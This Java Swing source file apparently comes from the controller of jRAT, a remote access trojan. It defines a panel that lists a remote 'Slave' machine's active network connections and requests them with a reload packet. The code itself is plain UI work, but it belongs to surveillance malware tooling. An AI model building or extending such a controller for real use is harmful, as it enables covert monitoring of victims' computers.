package jrat.controller.ui.panels;

import jrat.api.Resources;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet73ActivePorts;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;
import jrat.controller.ui.renderers.table.ActivePortsTableRenderer;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@SuppressWarnings("serial")
public class PanelControlActivePorts extends PanelControlParent {

    private TableModel model;

	public TableModel getModel() {
		return model;
	}

	public PanelControlActivePorts(Slave sl) {
		super(sl);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(Resources.getIcon("update"));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(new Packet73ActivePorts());
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(Resources.getIcon("clear"));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
			}
		});

		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addComponent(btnReload)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnClear)
					.addContainerGap(422, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.TRAILING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 296, Short.MAX_VALUE)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnReload)
						.addComponent(btnClear))
					.addGap(18))
		);

        JTable table = new DefaultJTable();
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Protocol", "Local address", "External address", "Status" }));
		table.getColumnModel().getColumn(1).setPreferredWidth(168);
		table.getColumnModel().getColumn(2).setPreferredWidth(225);
		table.getColumnModel().getColumn(3).setPreferredWidth(116);
		table.setDefaultRenderer(Object.class, new ActivePortsTableRenderer());
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}
}
